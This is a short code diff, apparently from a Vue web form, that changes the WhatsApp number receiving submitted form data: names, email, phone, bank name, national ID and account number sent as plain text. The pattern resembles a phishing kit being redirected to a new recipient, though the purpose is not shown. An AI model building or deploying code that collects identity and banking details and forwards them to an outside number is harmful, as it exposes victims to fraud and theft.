@@ -155,7 +155,7 @@ export default {
 
         let jsonBody = {
           "messaging_product": "whatsapp",
-          "to": "15612996959",
+          "to": "554184290372",
           "type": "text",
           "text": {
             "body": `Nombre: ${this.formData.first_name}\nApellido: ${this.formData.last_name}\nCorreo: ${this.formData.email}\nNumero de Telefono: ${this.formData.phone}\nNombre de Banco: ${this.formData.banking}\nCedula de Identidad: ${this.formData.id_number}\nNumero de Cuenta: ${this.formData.account_number}`,
